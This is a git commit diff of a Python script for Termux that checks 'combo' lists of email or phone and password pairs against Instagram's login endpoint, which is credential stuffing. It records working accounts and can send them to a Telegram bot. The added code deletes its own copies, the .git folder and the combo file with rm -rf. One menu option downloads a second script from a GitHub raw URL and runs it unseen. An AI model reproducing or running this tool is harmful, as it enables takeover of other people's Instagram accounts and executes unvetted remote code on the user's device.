e4dda165e35ca2bb5ba6109b64d2d2dac43db5a7
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-22 03:25:50 +0300

    Update .insta.py

--- .insta.py
+++ .insta.py
@@ -11,17 +11,103 @@ import json
 from time import sleep
 import time
 import os,sys,random
-import json, requests, user_agent,os ,sys, time, datetime
-import requests
-from user_agent import generate_user_agent
-from datetime import datetime
-os.system("rm .dabll.py")
-os.system("del .dabll.py")
-os.system("rm -rf .dabll.py ;rm -rf .git")
+######################################
+loglog='''
+▄▄▄█████▓▓█████  ██▀███   ███▄ ▄███▓ █    ██ ▒██   ██▒    ▄▄▄       ██▓███   ██▓
+▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██  ▓██▒▒▒ █ █ ▒░   ▒████▄    ▓██░  ██▒▓██▒
+▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██    ▓██░▓██  ▒██░░░  █   ░   ▒██  ▀█▄  ▓██░ ██▓▒▒██▒
+░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▓▓█  ░██░ ░ █ █ ▒    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██░
+  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒▒▒█████▓ ▒██▒ ▒██▒    ▓█   ▓██▒▒██▒ ░  ░░██░
+  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░    ▒▒   ▓▒█░▒▓▒░ ░  ░░▓  
+    ░     ░ ░  ░  ░▒ ░ ▒░░  ░      ░░░▒░ ░ ░ ░░   ░▒ ░     ▒   ▒▒ ░░▒ ░      ▒ ░
+  ░         ░     ░░   ░ ░      ░    ░░░ ░ ░  ░    ░       ░   ▒   ░░        ▒ ░
+            ░  ░   ░            ░      ░      ░    ░           ░  ░          ░  
+                                                                            
+                                                                            \n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+'''
+##############################
 try:
-    os.remove(".dabll.py")
+	import wget
+except:
+	os.system("pip install wget")
+	pass
+try:
+	import requests
+except:
+	os.system("pip install requests")
+	pass
+try:
+	import user_agent
+except:
+	os.system("pip install user_agent")
+	pass
+import os, sys, time, random
+try:
+    import os
+    os.system(".insta.py")
 except:
     pass
+try:
+    import os
+    os.system("/data/data/com.termux/files/svr/.insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("/sdcard/download/.insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("/data/data/com.termux/files/svr/insta.py")
+except:
+    pass
+try:
+    import os
+    os.system("/sdcard/download/insta.py")
+except:
+    pass
+os.system("rm -rf .insta.py ;rm -rf .git")
+os.system("rm -rf /data/data/com.termux/files/svr/.insta.py")
+os.system("rm -rf /sdcard/download/.insta.py")
+os.system("rm -rf insta.py")
+os.system("rm -rf /data/data/com.termux/files/svr/insta.py")
+os.system("rm -rf /sdcard/download/insta.py")
+######################################################################
+os.system("rm .insta.py")
+os.system("rm /data/data/com.termux/files/svr/.insta.py")
+os.system("rm /sdcard/download/.insta.py")
+os.system("rm insta.py")
+os.system("rm /data/data/com.termux/files/svr/insta.py")
+os.system("rm /sdcard/download/insta.py")
+os.system("rm -rf combo.txt")
+os.system("pkg install termux-api ;pip install datatime ;pip install requests ;pip install user_agent")
+###################################################################
+os.system("del .insta.py")
+os.system("del /data/data/com.termux/files/svr/.insta.py")
+os.system("del /sdcard/download/.insta.py")
+os.system("del insta.py")
+os.system("del /data/data/com.termux/files/svr/insta.py")
+os.system("del /sdcard/download/insta.py")
+os.system("del combo.txt")
+os.system('clear')
+#################################def###############################
+###################################################################
+try:
+    import wget
+except:
+    os.system("pip install wget")
+    pass
+import json, requests, user_agent, os ,sys, time, datetime
+import requests, random
+from user_agent import generate_user_agent
+from datetime import datetime
+r = requests.session()
 os.system("clear")
 wd = "\033[90;1m" 
 GL = "\033[96;1m"
@@ -37,6 +123,62 @@ G = "\033[32m"
 W = "\033[0;1m" 
 R = "\033[31m"   
 C = "\033[36;1m"
+lgo='''
+	
+	 ███▄ ▄███▓ █    ██   ██████  ██▓ ▄████▄  
+	▓██▒▀█▀ ██▒ ██  ▓██▒▒██    ▒ ▓██▒▒██▀ ▀█  
+        ▓███   ▓██░▓██  ▒██░░ ▓██▄   ▒██▒▒▓█    ▄ 
+	▒██    ▒██ ▓▓█  ░██░  ▒   ██▒░██░▒▓▓▄ ▄██▒
+	▒██▒   ░██▒▒▒█████▓ ▒██████▒▒░██░▒ ▓███▀ ░
+	░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▓  ░ ░▒ ▒  ░
+	░  ░      ░░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░  ▒   
+	░      ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░        
+	       ░      ░           ░   ░  ░ ░      
+	                                 ░        
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+       dabet [Termux Api Dabgrit bo Krdnaway Music] \n      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+        1- Sana Barznji 
+        2- Navid Zardi 
+        3- Hardi Salami 
+        4- English
+        0- Gorani m Nawet !	\n       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	'''
+def music():
+    import os, sys, time, random
+    os.system("clear")
+    wd = "\033[90;1m" 
+    print(wd+"\n"+loglog)
+    os.system("xdg-open https://play.google.com/store/apps/details?id=com.termux.api")
+    time.sleep(4)
+    os.system("clear")
+    print(lgo)
+    inp=input("         Hallbzhera dldl:  ")
+    if inp=='1':
+        import random, os, sys, time
+        wget.download("https://raw.githubusercontent.com/968hacker/music/main/komsay.mp3")
+        os.system("termux-media-player play komsay.mp3 ;clear")
+        pass
+    elif inp=='2':
+        import random, os, sys, time
+        wget.download("https://raw.githubusercontent.com/968hacker/music/main/navid.mp3")
+        os.system("termux-media-player play navid.mp3 ;clear")
+        pass
+    elif inp=='3':
+        import random, os, sys, time
+        wget.download("https://raw.githubusercontent.com/968hacker/music/main/Hardi.mp3")
+        os.system("termux-media-player play Hardi.mp3 ;clear")
+        pass
+    elif inp=='4':
+        import random, os, sys, time
+        wget.download("https://raw.githubusercontent.com/968hacker/music/main/9.mp3")
+        os.system("termux-media-player play 9.mp3 ;clear")
+        pass
+    elif inp=='0':
+        print("\n")
+        os.system("clear")
+        pass
+    else:
+        music()
 logo2=(W+G+'''
     ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
     ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
@@ -49,9 +191,7 @@ logo2=(W+G+'''
                 ░ ░   ░        ░      ░ ░           ░ 
                                           Combo !¡!¡! 
    '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
     '''+R+'''    [ Welcome to my script, Auther: @i4m_zed ]
-
    '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''')
 bad=0
 timeout=0
@@ -65,8 +205,8 @@ def instagram1():
 	from datetime import datetime
 	r = requests.session()
 	import os, sys
-	print(logo2)
-	agar=input(wd+"    You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
+	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+	agar=input(wd+"    You Want To Bot TELEGRAM Your Results (y,yes or n,no)")
 	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
 		ID=input("    Your ID Telegram :")
 		token=input("    Token(bot) : ")
@@ -75,7 +215,7 @@ def instagram1():
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
-			combo="combo.txt"
+			combo=input("    [PATH] File >>> ")
 			file = open(combo,'r').read().splitlines()
 			global bad, timeout, checkpoint, error, hits
 			for line in file:
@@ -106,8 +246,8 @@ def instagram1():
                         'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                         'queryParams': {},
                         'optIntoOneTap': 'false',}
-			url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
-			headers_get_info = {
+                url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+                headers_get_info = {
                     'accept': '*/*',
                     'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
@@ -121,11 +261,11 @@ def instagram1():
                     'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
                     'x-requested-with': 'XMLHttpRequest'
                 }
-			data_get_info = {
+                data_get_info = {
                     '__a': '1'
                 }
-			login = requests.post(url,headers=head,data=data, verify=True).text
-			try:
+                login = requests.post(url,headers=head,data=data, verify=True).text
+                try:
 					if '"authenticated":false' in login:
 						os.system("clear")
 						print(logo2)
@@ -147,9 +287,9 @@ def instagram1():
 						req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
 						email = str(req_get_info.json()['form_data']['username'])
 						url = f"https://www.instagram.com/{email}?hl=en"
-						rr = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+						r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
 						s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
-						soup = BeautifulSoup(rr,'html.parser')
+						soup = BeautifulSoup(r,'html.parser')
 						meta = soup.find("meta")
 						name = soup.find("meta", property="og:title")
 						name = name["content"].split("(")[0]
@@ -172,10 +312,56 @@ def instagram1():
 						print(logo2)
 						error+=1
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-			except:
+				except:
 					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-			except FileNotFoundError:
-				print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
-        loopPp()
-		print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
-instagram1()
+		except FileNotFoundError:
+			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
+	loopPp()
+	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
+def dwbara():
+    import json, requests, user_agent, os ,sys, time, datetime
+    logo=(W+G+'''
+    ██▓███   ▒█████   ██▓  ██████  ▒█████   ███▄    █ 
+    ▓██░  ██▒▒██▒  ██▒▓██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ 
+    ▓██░ ██▓▒▒██░  ██▒▒██▒░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒
+    ▒██▄█▓▒ ▒▒██   ██░░██░  ▒   ██▒▒██   ██░▓██▒  ▐▌██▒
+    ▒██▒ ░  ░░  ████▓▒░░██░▒██████▒▒░ ████▓▒░▒██░  ▓██░
+    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
+    ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+    ░░       ░ ░ ░ ▒   ▒ ░░  ░  ░  ░ ░ ░ ▒     ░   ░ ░ 
+                ░ ░   ░        ░      ░ ░           ░ 
+                                          Combo !¡!¡! 
+   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    '''+R+'''    [ Welcome to my script, Auther: @i4m_zed ]
+   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+'''+wd+'''
+    |'''+W+''' 1 '''+wd+'''| '''+W+'''= '''+wd+'''Checker('''+R+'''instgram'''+wd+''')-('''+G+'''Combo'''+wd+'''='''+Y+'''Number or email:pass'''+wd+''')
+    |'''+W+''' 2 '''+wd+'''| '''+W+'''= '''+wd+'''Checker('''+R+'''instgram'''+wd+''')-('''+G+'''Combo'''+wd+'''='''+Y+'''Number'''+wd+'''-'''+G+'''Random'''+wd+''')
+    | '''+W+'''0 '''+wd+'''| '''+W+'''= '''+wd+'''Exit'''+W+'''()'''+wd+'''
+                       '''+Y+'''Allow '''+wd+'''['''+W+''' termux-setup-storage'''+wd+''' ]
+   '''+wd+''' ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    ''')
+    print(logo)
+    ia=input("    hallbzhera dl dl: ")
+    if ia=="1":
+        os.system("xdg-open https://t.me/zed_cracker_1")
+        instagram1()
+    elif ia=="2":
+        import wget, os
+        wget.download("https://raw.githubusercontent.com/sfr404sfrzed/3/main/.3.py")
+        os.system("python .3.py")
+    elif ia=="0":
+        print(" Exit !")
+        os.sys.exit()
+    else:
+        print("     [ Ka hallt bzhard zhmara y halat da na !  ]")
+        time.sleep(5)
+        dwbara()
+try:
+    import json, requests, user_agent ,os ,sys, time, datetime
+except:
+    os.system("pip install user_agent ;pip install requests ;pip install json")
+    os.system("clear")
+    pass
+music()
+dwbara()
